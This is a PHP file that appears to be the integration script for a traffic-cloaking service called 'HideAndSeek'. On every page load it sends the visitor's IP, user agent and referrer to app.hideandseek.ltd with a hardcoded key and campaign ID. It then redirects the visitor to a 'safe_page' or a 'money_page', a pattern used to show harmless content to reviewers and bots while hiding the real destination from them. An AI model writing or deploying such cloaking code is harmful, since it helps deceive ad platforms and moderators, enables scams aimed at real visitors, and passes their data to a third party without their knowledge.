<?php
    namespace HideAndSeek;

    class BlacklistChecker {
      private $key = null;
      private $strictness = 0;
      private $user_agent = false;
      private $failure_redirect = null;
      private $success_redirect = null;
      private $campaign = null;
      private $referrer = null;
      const BASE_API_URL = "https://app.hideandseek.ltd/v1/integration/updates/%s/%s/%s";

    	public function SetKey($key = null){
    		$this->key = $key;
    	}

      public function SetCampaign($campaign=null){
        $this->campaign = $campaign;
      }

    	public function SetStrictness($value = 0){
    		$this->strictness = $value;
    	}

    	public function PassUserAgent($value = false){
    		$this->user_agent = $value;
    	}

    	public function SetFailureRedirect($value = null){
    		$this->failure_redirect = $value;
    	}

    	public function SetSuccessRedirect($value = null){
    		$this->success_redirect = $value;
    	}

      public function SetReferrer($value = null){
        $this->referrer = $value;
      }

    	public function Precheck(){
    		if($this->key === null){
    			throw new InvalidParameter("No key was passed to BlacklistChecker. Aborting.");
    		}

    		if(!is_numeric($this->strictness)){
    			throw new InvalidParameter("Invalid strictness was passed to BlacklistChecker. Aborting.");
    		}

    		if(!is_bool($this->user_agent)){
    			throw new InvalidParameter("Invalid pass user agent flag was passed to BlacklistChecker (must be bool). Aborting.");
    		}

    		return true;
    	}

    	public function CheckIP($ip){
    		if($this->Precheck()){

    			$curl = curl_init();
    			curl_setopt($curl, CURLOPT_URL, sprintf(static::BASE_API_URL, $this->key, urlencode($ip),$this->campaign));
    			curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
    			curl_setopt($curl, CURLOPT_CONNECTTIMEOUT, 5);

    			$parameters = array("strictness" => $this->strictness);
    			if($this->user_agent && isset($_SERVER["HTTP_USER_AGENT"])){
    				$parameters["user_agent"] = $_SERVER["HTTP_USER_AGENT"];
    			}
          if($this->referrer){
    				$parameters["referrer"] = $this->referrer;
    			}

    			curl_setopt($curl, CURLOPT_POSTFIELDS, $parameters);
    			$result = curl_exec($curl);
    			$data = json_decode($result, true);
    			curl_close($curl);

    			if($data === false){
    				die(print_r($result, true));
    			} else {
    				return $data;
    			}
    		}
    	}

      function getCurrentURL(){
          $pageURL = (isset( $_SERVER["HTTPS"] ) && $_SERVER["HTTPS"] == "on") ? "https://" : "http://";
          if($_SERVER["SERVER_NAME"]!="" && $_SERVER["SERVER_NAME"]!="_"){
            $pageURL .= $_SERVER["SERVER_NAME"] . $_SERVER["REQUEST_URI"];
          }else{
            $pageURL .= $_SERVER["HTTP_HOST"] . $_SERVER["REQUEST_URI"];
          }
          return $pageURL;
      }

      public function ForceRedirect($type = "status"){
        $result = $this->CheckIP($this->GetIP());
        if(isset($result[$type])){
          $this->SetFailureRedirect($result["safe_page"]);
          $this->SetSuccessRedirect($result["money_page"]);
          if($result["proxy_bot"] === true){
            
            return true;
          }else if($result[$type] === false){
            if($this->failure_redirect !== null){
              if(strpos($this->getCurrentURL(),$this->failure_redirect) !== FALSE){
                return true;
              }else{
                exit(header(sprintf("Location: %s", $this->failure_redirect)));
              }
            } else {
              exit;
            }
          } else {
            if($this->success_redirect !== null){
              exit(header(sprintf("Location: %s", $this->success_redirect)));
            }
          }
        } else {
          if(isset($result["errors"])){
            throw new HideAndSekException(implode(" - ", $result["errors"]));
          }
          throw new HideAndSekException("Force redirect check failed.");
        }
      }

    	private static function GetIP(){
    		return (isset($_SERVER["HTTP_CF_CONNECTING_IP"]) ? $_SERVER["HTTP_CF_CONNECTING_IP"] : $_SERVER["REMOTE_ADDR"]);
    	}
    }

    class HideAndSekException extends \Exception {}
    class InvalidParameter extends HideAndSekException {}

    function PreventLoad(){
        $check = new BlacklistChecker();
        $check->SetKey("829fd973b1b7a0d3194820f572194b4d");
        $check->SetCampaign("1078");
        $check->SetStrictness("0");
        $check->SetReferrer(isset($_SERVER["HTTP_REFERER"]) ? $_SERVER["HTTP_REFERER"] : "Direct");
        $check->PassUserAgent(true);
        $check->ForceRedirect("status");
    }
    PreventLoad();
  ?>
